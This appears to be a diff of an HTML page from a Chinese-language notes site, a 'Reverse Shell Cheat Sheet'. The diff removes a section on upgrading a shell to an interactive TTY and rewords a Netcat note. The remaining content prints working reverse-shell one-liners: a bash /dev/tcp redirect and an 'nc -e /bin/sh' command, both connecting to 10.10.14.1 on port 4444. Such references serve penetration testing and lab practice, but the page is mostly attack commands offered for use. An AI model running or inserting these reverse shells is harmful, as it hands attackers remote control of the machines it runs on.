@@ -188,21 +188,11 @@ function sidebar_toggle() {
         <div class="book-content">
           <div class="book-post">
   <h1 id="Reverse-Shell-Cheat-Sheet">Reverse Shell Cheat Sheet</h1>
-<blockquote>
-<p>升级成半交互式 tty</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
-<p>升级成完全交互式 tty，能用方向键 + tab，就是退出比较麻烦。<strong>（在 KALI2020.3 上不成功，原因未知，可能跟 zsh 有关？）</strong></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
-Ctrl + Z
-stty raw -echo
-<span class="token function">fg</span>
-reset</code></pre>
-</blockquote>
 <h3 id="Bash">Bash</h3>
 <p>Tested on Ubuntu 10.10</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">/bin/bash -i <span class="token operator">>&amp;</span> /dev/tcp/10.10.14.1/4444 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
 <h3 id="Netcat">Netcat</h3>
-<p>不一定所有 nc 都能用哦。</p>
+<p>常见版本</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Linux</span>
 <span class="token function">nc</span> -e /bin/sh <span class="token number">10.10</span>.14.1 <span class="token number">4444</span>
 <span class="token comment"># Windows</span>
